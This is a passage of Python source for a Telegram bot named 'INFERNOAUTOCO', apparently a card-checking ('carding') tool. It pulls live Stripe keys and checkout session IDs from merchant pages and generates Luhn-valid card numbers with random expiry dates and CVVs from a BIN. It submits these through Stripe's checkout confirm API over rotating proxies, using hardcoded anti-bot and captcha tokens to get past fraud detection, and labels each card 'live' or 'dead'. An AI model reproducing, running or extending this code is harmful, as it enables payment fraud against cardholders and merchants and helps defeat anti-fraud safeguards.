        cs_live = cs_match.group(0).strip('\'"')
        
        logger.info(f"Extracted PK: {pk_live[:10]}... CS: {cs_live[:10]}...")
        return pk_live, cs_live, page_source
        
    except Exception as e:
        logger.error(f"Key extraction failed: {e}")
        raise
    finally:
        if driver:
            try:
                driver.quit()
            except:
                pass

def get_firefox_path() -> str:
    paths = [
        "/data/data/com.termux/files/usr/bin/firefox",
        "/usr/bin/firefox",
        "/usr/local/bin/firefox",
        "C:\\Program Files\\Mozilla Firefox\\firefox.exe",
        "C:\\Program Files (x86)\\Mozilla Firefox\\firefox.exe",
        os.getenv("FIREFOX_BIN", ""),
    ]
    for path in paths:
        if path and os.path.exists(path):
            return path
    return "firefox"

def get_geckodriver_path() -> str:
    paths = [
        "/data/data/com.termux/files/usr/bin/geckodriver",
        "/usr/bin/geckodriver",
        "/usr/local/bin/geckodriver",
        os.getenv("GECKODRIVER_PATH", ""),
    ]
    for path in paths:
        if path and os.path.exists(path):
            return path
    return "geckodriver"

def get_muid_guid() -> Tuple[str, str, str]:
    headers = {
        'accept': '*/*',
        'content-type': 'text/plain;charset=UTF-8',
        'origin': 'https://m.stripe.network',
        'referer': 'https://m.stripe.network/',
        'user-agent': USER_AGENT,
    }
    
    proxy = get_proxy_with_fallback()
    
    for attempt in range(MAX_RETRIES):
        try:
            response = requests.post(
                'https://m.stripe.com/6',
                headers=headers,
                proxies=proxy,
                timeout=REQUEST_TIMEOUT
            )
            if response.status_code == 200:
                data = response.json()
                return (
                    data.get("muid", str(uuid.uuid4()).replace('-', '')[:32]),
                    data.get("guid", str(uuid.uuid4()).replace('-', '')[:32]),
                    data.get("sid", str(uuid.uuid4()).replace('-', '')[:32])
                )
        except Exception as e:
            logger.warning(f"MUID fetch attempt {attempt+1} failed: {e}")
            time.sleep(1)
    
    return (
        str(uuid.uuid4()).replace('-', '')[:32],
        str(uuid.uuid4()).replace('-', '')[:32],
        str(uuid.uuid4()).replace('-', '')[:32]
    )

def init_payment_session(pk_live: str, cs_live: str, currency_override: Optional[str] = None) -> Tuple[Optional[Dict], Optional[str]]:
    logger.info(f"Initializing session (override: {currency_override})")
    
    headers = {
        'accept': 'application/json',
        'content-type': 'application/x-www-form-urlencoded',
        'origin': 'https://checkout.stripe.com',
        'referer': 'https://checkout.stripe.com/',
        'user-agent': USER_AGENT,
    }
    
    data = f'key={pk_live}&eid=NA&browser_locale=en-US&browser_timezone=Asia/Calcutta&redirect_type=stripe_js'
    proxy = get_proxy_with_fallback()
    
    for attempt in range(MAX_RETRIES):
        try:
            response = requests.post(
                f'https://api.stripe.com/v1/payment_pages/{cs_live}/init',
                headers=headers,
                data=data,
                proxies=proxy,
                timeout=REQUEST_TIMEOUT
            )
            
            if response.status_code != 200:
                logger.warning(f"Init failed (attempt {attempt+1}): {response.status_code}")
                if attempt < MAX_RETRIES - 1:
                    time.sleep(2 ** attempt)
                    continue
                return None, None
            
            json_data = response.json()
            current_currency = json_data.get('currency', 'usd')
            logger.info(f"Session currency: {current_currency}")
            
            if currency_override and currency_override.lower() != current_currency.lower():
                logger.info(f"Switching currency to {currency_override}")
                update_data = {
                    'eid': 'NA',
                    'updated_currency': currency_override.lower(),
                    'key': pk_live,
                }
                update_headers = headers.copy()
                update_headers['authority'] = 'api.stripe.com'
                
                upd_resp = requests.post(
                    f'https://api.stripe.com/v1/payment_pages/{cs_live}',
                    headers=update_headers,
                    data=update_data,
                    proxies=proxy,
                    timeout=REQUEST_TIMEOUT
                )
                if upd_resp.status_code == 200:
                    json_data = upd_resp.json()
                    logger.info(f"Currency switched to: {json_data.get('currency')}")
                else:
                    logger.warning(f"Currency switch failed: {upd_resp.text[:100]}")
            
            return json_data, json_data.get('currency')
            
        except Exception as e:
            logger.warning(f"Init attempt {attempt+1} error: {e}")
            if attempt < MAX_RETRIES - 1:
                time.sleep(2 ** attempt)
    
    return None, None

def parse_init_response(init_data: Dict) -> Dict:
    info = {
        'init_checksum': init_data.get('init_checksum', ''),
        'config_id': init_data.get('config_id', ''),
        'site_name': 'Unknown',
        'site_url': 'Unknown',
        'amount_cents': '0',
        'amount_display': '$0.00',
        'customer_email': '',
        'country_code': 'US',
        'currency': init_data.get('currency', 'usd')
    }
    
    if init_data.get('account_settings'):
        info['site_name'] = init_data['account_settings'].get('display_name', 'Unknown')
        info['site_url'] = init_data['account_settings'].get('business_url', 'Unknown')
    
    amount_cents = init_data.get('total_summary', {}).get('total')
    if amount_cents:
        info['amount_cents'] = str(amount_cents)
        info['amount_display'] = f"${int(amount_cents)/100:.2f}"
    
    info['customer_email'] = init_data.get('customer_email', '')
    info['country_code'] = init_data.get('geocoding', {}).get('country_code', 'US')
    
    return info

def confirm_payment(pm_id: str, cs_live: str, pk_live: str, amount: str, 
                    muid: str, guid: str, sid: str, init_checksum: str, 
                    config_id: str) -> requests.Response:
    logger.info(f"Confirming payment for PM: {pm_id[:10]}...")
    
    headers = {
        'authority': 'api.stripe.com',
        'accept': 'application/json',
        'accept-language': 'en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7',
        'cache-control': 'no-cache',
        'content-type': 'application/x-www-form-urlencoded',
        'origin': 'https://checkout.stripe.com',
        'pragma': 'no-cache',
        'referer': 'https://checkout.stripe.com/',
        'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Linux"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'user-agent': USER_AGENT,
    }
    
    js_checksum = "qto~d%5En0%3DQU%3Eazbu%5D%5D%5BO%24%25%5C%60%5D%3CXv%3CNoR%40ba%3DTD%5E_ona%3C%24zlto%3FU%5E%60w"
    version = "39398bacd7"
    
    client_session_id = str(uuid.uuid4())
    pxvid = str(uuid.uuid4())
    pxcts = str(uuid.uuid4())
    
    px3 = "9615971b055100b7d6257e05a244d31ccaae33bf8437f2a386851dd816b61844%3ArRfUR2d1egF3zPCRebsNNrKd2rxlIMPFic5k3GccijJMAeDB0TEIwxsY2SHmkpoyJlV8FFgcx8NUGkWMMSwrRA%3D%3D%3A1000%3A72EJM5MWS9xButhCFmMHcZ%2FoGZiwRW5pHXK3v7wP1L94JdiBJBmVUlI5DxzUb7kf%2FjccxAVFhNq2bwHlLjdsNWYbw7HhiXNtYH%2FxWkaMe192VvE0K%2FriSW3P4g%2Fk%2BO39RQZrm11%2Bn4AJ3YlsWHmB%2F%2FMau3ITOQuXCBqVhn%2FNQBGFYRCTJAFV3QNQUOOXlk97vELgah0NcIGDGsYYK5ar%2B76rm4BCop%2BY0S0TiCyBFnlQWb4fJqz3yBlah0lxy0%2F8N4zCrUCwo%2FpNMbGAs%2BYLTgXvAzo2oG51MxGGVqfPl4qCnait3I%2F9mak0bbxyHiNMzuz9bxl1FBhe0UiO%2B0uWHKEpKYvLBeJDxnSbZ7XUNNf0JACFQzTtSPPIsWyctyxUFO2BdzqW40ydmF6KVd%2Fl83sVm2ACX%2BGqRPzZEDHSrqnp5%2F73bDtyY66SIA6bFcs8HbgIsHZmL4XvskPpxnd%2B6DqevyxyhnGC4x9fpyX9S5j5fnGdeTiQeijDD2PwHtSa3kHZsczaLe%2FeyMBchUaDal%2FA3k5Z%2BCX8I0GD4kfNbRG7eo4ArwOzcGoKP02dag1d"
    
    passive_captcha_token = "P1_eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJwZCI6MCwiZXhwIjoxNzczMTcyNjU5LCJjZGF0YSI6IlVDeENOQytRNHpQZGpHZm1xZTNpLzhZS2UvWHJ3d3cycS9wVkVZRHhVUTZJMUhEaVZOeFMrMEV5d1VYTFJGQkM4dmRQZFJtQllCZU0zWkNjZjVWVEI2bzRqSklkTnFpT2JJV1VmV0FlNzJENmVxMjpTakNJRktxaXA4UzVrL2R5RnJnY1BhMHRrVy9pWkVKOHdXWHB3T3FBRmZOamJzRFFWOE9YeUZTSjRqN2RnRC94RnpQRVVKaDBmaVo2bE52RW9wbWhVOHRBQ1NZVmF0R3k3NGcybVFpU1laYXRQdldZdTI3aYvZW9sc3RyOTdPblNNbWJIUFJJNnpRcEgwcW9mTTg3UlZlZzZZSlNyT2tKQkdKcWs0RFU4dmZtZ1dISkxYaG1GQ0JHcnhheEJLbVVoa0pnSnM5UmZVcUNhM056d2JaVFkzTkpDY2syeFpaQmw0V2Myc2RBbEtYbXFDaXY0cUI1aEhzaDNOUlNKMk9lbURHRGpHb2dMb2JvK0hRQjZyQXYvS2txNmc4Y002SWFEMGRHWVdiNVlHYTZWNmwzZVZGNHQ3RkZBSUhLVUI0T1RDTThsQjR5K3NoT2JrMXVGbEgxQ1A4OWhJOG4iLCJwYXNza2V5IjoiRCtHMEk4dk1QSnIwTDREYkIreWZzQTdFTWI4WUsvMlpJVW1CcTRsZWYwa3drcWFlN0tpejdta3lzOWVmTDdjbUhZbXZ3YlBwSG5YNS9uU0pQWjRiRzROdXI1Zm0yZzJVRVNZOUtReHI4emJyeUtWL0o2T2FFNm9ObzhQamYxWEhIZlVNWEFEWHRKUUxoRGNtbGxpaGdKOFQwcXhSTVNZelREMVlsTjNFWFpla3MrTVFSclRRWGxEVGFYY0VMeHcyR1libHZOU0VLbTVUdXRhMEVib1RkZlBTU3pFM2tZMTlKMlRjMVBiMjhXNUN5NnhOVFRoeERNM0YrVkJPRjVzUmFnbTVidU9KSDRxSnJkUGo5OWozUHFJalI1bzJXUmQwcVFiczhjc2xEbXNlUTVTSWZzNHdjeXpWRVhCLzM0SDdxY2VtNFJGK2pIS3dFcCtRZHlQRlIxU1RXSktpcFJKS0d1dlA5SVNCUTQzVnZCMzZCek5ZTXhuYmhCdS9CZnlyRDlNVVlQM2Vha0VPSm5LUGtadkFPdFFWSDJ4MzZqekRjNzdML0gzUitzbnVVWlUvMmIzSmdYUmtyZDg5NEQ0Z2pjaTB1Vyswd3Q2REFqaEFuaFlrL2c2cWlOR1JNS3dXWW1ScHAvQmRzWmcra2ZyY3Vaalc4RnQyaHkyWThJNTdmalNqcmF4aDJucG1hNVBpTTh4MElmS2tDUWZvcXNqTTZTL29tSnBBN0hVZkViSDF2UDdLcWV1Mys2MlVzeHJYSnZhZFAzcWs5SlZCQW5ONVJ4K2ZMZmpIdHR6V2IyWEp2RjE4WVhPWjRPOFdTaVFqdVBjUkdxbEx3cUZJQWVkNmRtdTFyUWlUK0NmeEh4MEVkc2FvNHROS1FCN1poMVR2d2tyY3ZCbmhON1AyWklsclJ3OVJzdHYrc0NPcVpIc0ovR3BBYWh1VlZtakNTNjdSNzY0SGlMZFRPcHNTNUh1WGQwQTZJRXJEbloxOUxRamo2ejVjeWVEZ0xWMlhTazhlMnY1Y0lEbmE3VEhyZEl2M2ljQjV0REpTVDRZN1l3UzA1RW5Ddm5JUzd1TUp3eXlaNzVQc2pUMjVTVnJURUk1bXZhR3gyVDVIOHFoYmN6dWlxWlhZdEszN3RLMTVoYVBqV1hOdjl2R2RsQ1RhZ1JWZlRGck9TSGpHa0huZXVIV3ErQW9kT29lKzlkdTRQOGhTeG9WR0lCVmE3dW1tVHRDNUliWlhsaGVCWlR0aEo2YXJvbEhEdHVyRzNJNFdHUE1SVUtnbVBlUzNLNFZrQmltYUNQZU1jdWlrS3ZZaEZSdUhYaDRJb0c0SWNHSEtvbWtGRXNhRGJ1RTFIeU05Znoza2dHMGRpRnNGVzRBMUNDTWhRdkhXanczN1RiSllPallXNVRLZExPZjRXNlRYbHY1YW9EV2ZnY29BVkdpNUVCL3dzR1Z0NldhNll2ZExybWZPWjdZN2R4NzNma2hQbW1hbldheEVRNzhyVEYxOWhLdlJzOVZGY0hHVGlpQXhzcjNWYXRjMkw0cjNOSGFtalVkUlU2bnlmVkJRY2EzSnBCK1lUZWR2aFNPMWhDYnp0TFN0YTZTdklUSHZSN0diajVqOUxCbXZMN3NyY1hNMXp1ci84RFREbTR0WnoyWHBiT0RRakk4WUhGelRGNVNMVTRnK25helV6MEZkcFB1Wm9PMHNJa2E1d0Jlak1ER05zUUVlb3JzSHpuamtFZXhzV0l2WkdjeTNRRG96R0tBd05jdlR4K0Z6djhiS2RKaDRJSEttOHA0RUhCL0hLYVgzZmxqWkRkWTU0QVBMZFpZbElzTmtWb0VmMGI2NzFtT09hL1creHRCa2ZQOTQvT2VsMHJ1L1gweUN6ajExeTF4Qzg5SWdmNEZxdEpQdkdEQU9vRzYvM3p0Q2QrNjMwZGFEKzBtdkhXM0lTckhlZm0vSVVKblEwbjhtWmZJU1VxdjdtOEN2cTU1alo2T0J0Rlo1K1dJT0Y0U3lYYkFlak5sTmNxQWtadUkyTGd5bnBKR1g4VnlJRExvekRNall6MmlpakRVNnFmaWlMSnJ1ZG9XbEJmK3lNak9ya1hDcFhOak16Q2xCTy9meVpCM05MK1FQMlN4Ti9YTjhldjkrUW9NTVhUNXlYeUV1ZGFIMENBb0s5cWNrQ1ZQYlhYWEJrb2ZlTSs5ZnFpWHJlNnNyaVJuRk5YcHJLTUtoQmhlVmlBR0NNVW11Z1YxVEVpWE14R0FXNGZocVlrSjdCeFI2SE96cndqZmdJNnE2V3k0anNGeG5haGR4dzdBbTArVVNBSnFUWjJtalVIMzNZSGxqRlFDNXlPSUtSV3N6dGR4THVyenFvR1pQbEdnTVhZSm5QSFhYcnRWekNaTzBxZk1mUzJFclp4aTJJSklJamFKZllOeUF1dWZWOUJkQ29tOHpPUDZSajJXR2YxZGI1bnRNSU5Ta3JIc0VsV3BKTUZRUkJqWExRMGtDcjdvTVFtQVdzbDNLQ1U2M0l4OU0xdlIrMXpNU2tQR3Q2RXFMWnJnOGQ4YjFVWDJZS3BZeG84UDFOd0lXZWd3MHRGR3pvbjZrSVNFcFl1c0hOU0REbVJXT2trN1RpZkNQSUFyMHB0cFYzODJ3bTdYMXZEenlJeWJNSnJ2QTZTR09nWXhockwyZTYxUVZaaFExb2JUWkJUbHdvOXJXTWxGaXZjYUJGYlFCb1N0VG1ueGo5RjRSMkp5YUpKYlNzR0VqcUFxRlNjL3cyeVJOeXdLdVptQ0wxQnBiZ200SmE0ays1cXlGM2dpRHp2STBXREJBMU9vSkJxSGYxRkJYUmRYckQ1VmpSdjc4OElEWDRZRHovUVlIU3ZKNVZtVThuMFZWY1RvN1dpWFIvbGpabDZVc0haRkM1bXNkQ042MEd6ZWJXbWNneDZETDNJRkFHcW5iR0R1ODc2QW1oZEFLTCtBNTJPazRMMDZudWM2ei9oL1BmYVA2NGtGR1pLWmhMMk92TjMyMlZXUWpZUT09Iiwia3IiOiI0YThlNDcyZSIsInNoYXJkX2lkIjoyNTkxODkzNTl9.CuQToFA86y4icWpzkbAxbfeDCGoJP5y4pjFf-HsKYu8"
    
    data = (
        f'eid=NA'
        f'&payment_method={pm_id}'
        f'&expected_amount={amount}'
        f'&expected_payment_method_type=card'
        f'&guid={guid}'
        f'&muid={muid}'
        f'&sid={sid}'
        f'&key={pk_live}'
        f'&version={version}'
        f'&init_checksum={init_checksum}'
        f'&js_checksum={js_checksum}'
        f'&px3={px3}'
        f'&pxvid={pxvid}'
        f'&pxcts={pxcts}'
        f'&passive_captcha_token={passive_captcha_token}'
        f'&passive_captcha_ekey='
        f'&rv_timestamp={js_checksum}'
        f'&client_attribution_metadata[client_session_id]={client_session_id}'
        f'&client_attribution_metadata[checkout_session_id]={cs_live}'
        f'&client_attribution_metadata[merchant_integration_source]=checkout'
        f'&client_attribution_metadata[merchant_integration_version]=hosted_checkout'
        f'&client_attribution_metadata[payment_method_selection_flow]=automatic'
        f'&client_attribution_metadata[checkout_config_id]={config_id}'
    )
    
    proxy = get_proxy_with_fallback()
    
    for attempt in range(MAX_RETRIES):
        try:
            response = requests.post(
                f'https://api.stripe.com/v1/payment_pages/{cs_live}/confirm',
                headers=headers,
                data=data,
                proxies=proxy,
                timeout=REQUEST_TIMEOUT
            )
            if response.status_code == 200:
                logger.info("Payment confirmation successful")
            return response
        except Exception as e:
            logger.warning(f"Confirm attempt {attempt+1} failed: {e}")
            if attempt < MAX_RETRIES - 1:
                time.sleep(2 ** attempt)
    
    return requests.Response()

# ==========================================
# UTILITY FUNCTIONS
# ==========================================

def calculate_luhn(number: str) -> int:
    total = 0
    should_double = True
    for digit_char in reversed(number):
        digit = int(digit_char)
        if should_double:
            digit *= 2
            if digit > 9:
                digit -= 9
        total += digit
        should_double = not should_double
    return (10 - (total % 10)) % 10

def is_bin_input(input_str: str) -> bool:
    clean = input_str.replace('|', '').replace('/', '').replace('-', '')
    return clean.isdigit() and len(clean) <= 8

def parse_bin_input(bin_input: str) -> Tuple[str, Optional[str], Optional[str]]:
    parts = bin_input.split('|')
    bin_part = re.sub(r'\D', '', parts[0].strip())
    
    month = None
    year = None
    
    if len(parts) > 1 and parts[1].strip():
        month = parts[1].strip().zfill(2)
    
    if len(parts) > 2 and parts[2].strip():
        year = parts[2].strip()[-2:].zfill(2)
    
    return bin_part, month, year

def generate_cards_from_bin(bin_part: str, fixed_month: Optional[str] = None, 
                            fixed_year: Optional[str] = None, count: int = 10) -> List[str]:
    cards = []
    count = min(count, MAX_CARDS)
    
    for _ in range(count):
        is_amex = bin_part.startswith(('34', '37'))
        target_length = 15 if is_amex else 16
        cvv_length = 4 if is_amex else 3

        card_number = bin_part
        while len(card_number) < target_length - 1:
            card_number += str(random.randint(0, 9))

        check_digit = calculate_luhn(card_number)
        full_card = card_number + str(check_digit)

        if fixed_month:
            month = fixed_month
        else:
            month = str(random.randint(1, 12)).zfill(2)
        
        if fixed_year:
            year = fixed_year
        else:
            future_year = datetime.now().year + random.randint(1, 4)
            year = str(future_year)[-2:]

        cvv = ''.join(str(random.randint(0, 9)) for _ in range(cvv_length))
        cards.append(f"{full_card}|{month}|{year}|{cvv}")
    
    return cards

def process_card(card_data: str, session_data: Dict) -> Dict:
    try:
        parts = card_data.split("|")
        
        if len(parts) >= 4:
            cc, mm, yy, cvv = parts[0], parts[1], parts[2], parts[3]
        elif len(parts) == 3:
            cc, mm, yy = parts
            cvv = "000"
        elif len(parts) == 1:
            cc = parts[0]
            mm = "01"
            yy = str(datetime.now().year + 2)[-2:]
            cvv = "000"
        else:
            raise ValueError(f"Invalid card format: {card_data}")
        
        cc = cc.replace(" ", "").replace("-", "")
        
        if len(yy) == 2:
            yy = "20" + yy
        if len(mm) == 1:
            mm = "0" + mm
        
        start_time = time.time()
        
        pm_response = create_payment_method(
            cc, mm, yy, cvv,
            session_data['pk_live'],
            session_data['muid'],
            session_data['guid'],
            session_data['sid'],
            session_data['cs_live'],
            session_data.get('country_code', 'US')
        )
        
        elapsed = time.time() - start_time
        
        if not hasattr(pm_response, 'status_code'):
            return {
                'status': 'dead',
                'message': 'No response from Stripe',
                'time': f"{elapsed:.2f}s",
                'card': card_data,
                'code': 'http_error'
            }
        
        if pm_response.status_code != 200:
            try:
                error_data = pm_response.json() if hasattr(pm_response, 'json') else {}
                error_msg = error_data.get('error', {}).get('message', f'HTTP {pm_response.status_code}')
                error_code = error_data.get('error', {}).get('code', 'http_error')
                
                if detect_3d_secure(error_msg):
                    return {
                        'status': 'dead',
                        'message': '🔐 3D SECURE REQUIRED - Card needs OTP/PIN verification',
                        'time': f"{elapsed:.2f}s",
                        'card': card_data,
                        'code': '3d_secure'
                    }
            except:
                error_msg = f'HTTP {pm_response.status_code}'
                error_code = 'http_error'
            
            return {
                'status': 'dead',
                'message': error_msg,
                'time': f"{elapsed:.2f}s",
                'card': card_data,
                'code': error_code
            }
        
        pm_data = pm_response.json()
        pm_id = pm_data.get("id")
        
        if not pm_id:
            return {
                'status': 'dead',
                'message': 'No payment method ID',
                'time': f"{elapsed:.2f}s",
                'card': card_data,
                'code': 'no_pm_id'
            }
        
        confirm_response = confirm_payment(
            pm_id,
            session_data['cs_live'],
            session_data['pk_live'],
            session_data['amount_cents'],
            session_data['muid'],
            session_data['guid'],
            session_data['sid'],
            session_data['init_checksum'],
            session_data['config_id']
        )
        
        elapsed = time.time() - start_time
        
        if not hasattr(confirm_response, 'status_code'):
            return {
                'status': 'dead',
                'message': 'No confirmation response',
                'time': f"{elapsed:.2f}s",
                'card': card_data,
                'code': 'http_error'
            }
        
        if confirm_response.status_code == 200:
            result = confirm_response.json()
            if result.get('payment_intent', {}).get('status') == 'succeeded':
                return {
                    'status': 'live',
                    'message': 'Payment Successful',
                    'time': f"{elapsed:.2f}s",
                    'card': card_data,
                    'code': 'succeeded'
                }
            elif result.get('status') == 'succeeded':
                return {
                    'status': 'live',
                    'message': 'Payment Successful',
                    'time': f"{elapsed:.2f}s",
                    'card': card_data,
                    'code': 'succeeded'
                }
        
        if confirm_response.status_code == 400:
            try:
                error_data = confirm_response.json()
                error_obj = error_data.get('error', {})
                error_msg = error_obj.get('message', 'Payment failed')
                error_code = error_obj.get('decline_code') or error_obj.get('code', 'unknown_error')
                
                if detect_3d_secure(error_msg):
                    return {
                        'status': 'dead',
                        'message': '🔐 3D SECURE REQUIRED - Card needs OTP/PIN verification',
                        'time': f"{elapsed:.2f}s",
                        'card': card_data,
                        'code': '3d_secure'
                    }
                
                if "no longer active" in error_msg.lower() or "expired" in error_msg.lower():
                    return {
                        'status': 'expired',
                        'message': error_msg,
                        'time': f"{elapsed:.2f}s",
                        'card': card_data,
                        'code': 'expired_session'
                    }
                
                return {
                    'status': 'dead',
                    'message': error_msg,
                    'time': f"{elapsed:.2f}s",
                    'card': card_data,
                    'code': error_code
                }
            except:
                pass
        
        if confirm_response.status_code >= 500:
            return {
                'status': 'dead',
                'message': f'Server error {confirm_response.status_code}',
                'time': f"{elapsed:.2f}s",
                'card': card_data,
                'code': 'http_error'
            }
        
        return {
            'status': 'dead',
            'message': f'HTTP {confirm_response.status_code}',
            'time': f"{elapsed:.2f}s",
            'card': card_data,
            'code': 'http_error'
        }
        
    except Exception as e:
        logger.error(f"Process card error: {e}")
        return {
            'status': 'dead',
            'message': str(e)[:100],
            'time': 'Error',
            'card': card_data,
            'code': 'exception'
        }

# ==========================================
# MAIN ENTRY POINT
# ==========================================
if __name__ == "__main__":
    print("""
    ╔═══════════════════════════════════════════════════════════════════╗
    ║  INFERNOAUTOCO v10.0 "ULTIMATE EDITION"                          ║
    ║  Powered by CAT Shadow Hacker                                   ║
    ║  NEW: 100+ Address Rotation                                     ║
    ║  NEW: 100+ Name Rotation                                        ║
    ║  NEW: 3D Secure Detection                                       ║
    ║  NEW: Smart HTTP Error Handling                                 ║
    ║  Eternal License - All Rights                                  ║
    ╚═══════════════════════════════════════════════════════════════════╝
    """)
    
    load_proxies_from_file()
    
    logger.info(f"Bot started with {len(loaded_proxies)} proxies")
    logger.info(f"Max cards: {MAX_CARDS}, Timeout: {REQUEST_TIMEOUT}s")
    logger.info(f"Proxy file: {PROXY_FILE}")
    logger.info(f"Working proxy file: {WORKING_PROXY_FILE}")
    logger.info(f"Addresses loaded: {sum(len(addr) for addr in ADDRESSES.values())}")
    logger.info(f"Names available: {len(FIRST_NAMES) * len(LAST_NAMES)} combinations")
    logger.info("ULTIMATE MODE ENABLED - Address rotation + Name rotation")
    logger.info("Listening for commands...")
    
    try:
        bot.infinity_polling(timeout=60, long_polling_timeout=30)
    except KeyboardInterrupt:
        logger.info("Shutting down...")
        save_proxies_to_file()
    except Exception as e:
        logger.error(f"Bot error: {e}")
        save_proxies_to_file()
        sys.exit(1)
